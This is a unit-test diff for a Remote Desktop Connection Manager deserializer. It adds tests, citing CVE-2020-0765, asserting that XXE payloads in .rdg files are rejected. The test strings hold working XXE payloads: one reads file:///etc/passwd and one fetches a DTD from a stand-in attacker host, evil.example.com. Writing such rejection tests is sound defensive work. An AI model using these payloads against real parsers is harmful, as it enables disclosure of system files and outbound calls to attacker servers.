@@ -361,4 +361,31 @@ public class RemoteDesktopConnectionManagerDeserializerTests
         var connection = group1.Children.First();
         Assert.That(connection.RDPStartProgram, Is.EqualTo(ExpectedStartProgram));
     }
+
+    // CVE-2020-0765: Remote Desktop Connection Manager Information Disclosure via XXE
+    [Test]
+    public void DeserializerRejectsXxePayloadInRdgFile()
+    {
+        // A malicious .rdg file with an XXE payload should be rejected outright.
+        // DtdProcessing.Prohibit in SecureXmlHelper must prevent this attack vector.
+        string xxePayload = @"<?xml version='1.0'?>
+<!DOCTYPE RDCMan [
+<!ELEMENT RDCMan ANY>
+<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
+<RDCMan programVersion='2.7' schemaVersion='3'>&xxe;</RDCMan>";
+
+        Assert.Throws<System.Xml.XmlException>(() => _deserializer.Deserialize(xxePayload));
+    }
+
+    [Test]
+    public void DeserializerRejectsExternalEntityInRdgFile()
+    {
+        // A second XXE variant using an external URL — also rejected by SecureXmlHelper.
+        string externalEntityPayload = @"<?xml version='1.0'?>
+<!DOCTYPE RDCMan [
+<!ENTITY ext SYSTEM 'http://evil.example.com/malicious.dtd'>]>
+<RDCMan programVersion='2.7' schemaVersion='3'>&ext;</RDCMan>";
+
+        Assert.Throws<System.Xml.XmlException>(() => _deserializer.Deserialize(externalEntityPayload));
+    }
 }
